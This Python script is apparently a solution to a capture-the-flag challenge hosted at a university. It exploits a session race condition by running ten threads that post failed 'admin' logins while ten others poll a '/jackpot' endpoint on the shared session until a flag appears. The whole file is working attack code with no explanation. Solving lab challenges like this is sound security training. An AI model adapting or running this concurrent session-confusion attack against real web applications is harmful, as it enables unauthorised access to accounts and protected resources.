import requests
import threading
import time

BASE = "http://mustard.stt.rnl.tecnico.ulisboa.pt:25652"

s = requests.Session()
s.get(BASE)   # initialize session, get JTOKEN

# Shared stop flag
stop = threading.Event()

def login_spammer():
    while not stop.is_set():
        try:
            s.post(BASE + "/login", data={
                "username": "admin",
                "password": "wrong"
            }, timeout=0.5)
        except:
            pass

def jackpot_spammer():
    while not stop.is_set():
        try:
            r = s.get(BASE + "/jackpot", timeout=0.5)
            if "SSof{" in r.text:
                print("\n\n[ !!! ] REAL FLAG FOUND:\n")
                print(r.text)
                stop.set()  # signal all threads to stop
        except:
            pass

# Start threads
threads = []
for _ in range(10):
    t = threading.Thread(target=login_spammer)
    t.start()
    threads.append(t)

for _ in range(10):
    t = threading.Thread(target=jackpot_spammer)
    t.start()
    threads.append(t)

# Wait until stop is set
while not stop.is_set():
    time.sleep(0.1)

# Join threads to exit cleanly
for t in threads:
    t.join()
